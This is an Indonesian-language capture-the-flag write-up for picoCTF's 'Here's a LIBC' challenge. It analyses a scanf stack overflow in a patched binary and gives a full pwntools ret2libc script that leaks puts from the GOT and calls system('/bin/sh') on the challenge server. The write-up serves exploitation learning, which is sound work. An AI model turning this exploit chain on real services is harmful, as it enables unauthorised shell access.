# Here's a LIBC

# deskripsi

# analysis & exploit step by step
karena file binary ini memiliki libc sendiri jadi aku harus menggunakan pwninit agar ia ter-patch sehingga menggunakan libc yang diberi, bukan libc os.

<p align="center"> <img width="1892" height="678" alt="image" src="https://github.com/user-attachments/assets/e0cd0d04-1879-466e-834b-eeec8e3d2e48" /> </p>

dengan ini vuln akan menjadi vuln_patched dan sudah bisa di eksekusi / dijalankan seperti biasa. btw abaikan saja error messagenya..


jalankan file binary / program nya

<p align="center"><img width="585" height="289" alt="image" src="https://github.com/user-attachments/assets/2a37d6a3-c339-4dda-9544-7f512aa5913f" /></p>

program ini akan merubah string input menjadi lowercase atau sebaliknya. yang genap jadi lowercase. dan yang ganjil sebaliknya. aku lanjutkan analisis dengan ghidra 


tidak ada fungsi menarik, bahkan tidak ada fungsi print flag , win, atau sebagainya. hanya ada main dan do_stuff.

<p align="center"> <img width="742" height="392" alt="image" src="https://github.com/user-attachments/assets/44421096-7f8b-4d7f-9453-c1bf06dca895" /> </p>

do_stuff():

```C

void do_stuff(void)

{
  char cVar1;
  undefined1 local_89;
  char local_88 [112];
  undefined8 local_18;
  ulong local_10;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",local_88);
  __isoc99_scanf(&DAT_0040093a,&local_89);
  for (local_10 = 0; local_10 < 100; local_10 = local_10 + 1) {
    cVar1 = convert_case((int)local_88[local_10],local_10);
    local_88[local_10] = cVar1;
  }
  puts(local_88);
  return;
}

```

fungsi ini hanya melakukan pembalikan case pada string yang kita input. dan mencetaknya dengan fungsi puts. jika melakuan buffer overflow aku bisa melakukan rop chain dan 
me leak alamat libc lewat puts ini.

idenya aku akan melakukan leak libc dan memaksa program memanggil fungsi system(/bin/sh) untuk mendapatkan shell dan melakukan print flag. 

<p align="center"> <img width="406" height="104" alt="image" src="https://github.com/user-attachments/assets/fd3a86b0-6d58-40d1-bb54-c0c6fea79040" /> </p>
disini offset input kita adalah rbp-0x80 maka perlu mengisi padding sebesar itu untuk dapat membuat rop chain.

skrip python :
```Python
from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./vuln_patched")
lib = ELF("./libc.so.6")

padd = b"A"*(0x80 + 8)
rdi_ret = 0x0000000000400913
ret = 0x000000000040052e

SERV = "wily-courier.picoctf.net"
PORT = 53553

if args.LOCAL:
    p = process("./vuln_patched")
else:
    p = remote(SERV,PORT)


leaklibc = flat(
    padd,
    rdi_ret,
    elf.got.puts,
    elf.plt.puts,
    elf.sym.main
)

p.recvline()
p.sendline(leaklibc)
p.recvline()
puts_leak_addr = u64(p.recv(6).strip().ljust(8,b'\00'))
lib.address = puts_leak_addr - lib.sym.puts
print(hex(lib.address))

payload = flat(
    padd,
    rdi_ret,
    next(lib.search(b"/bin/sh\00")),
    ret,
    lib.sym.system,
)

p.sendline(payload)
p.interactive()
```

<p align="center"><img width="647" height="412" alt="image" src="https://github.com/user-attachments/assets/039f072b-7e89-4995-bb03-b7bb0895e8bc" /></p>

flag = picoCTF{...............................................}
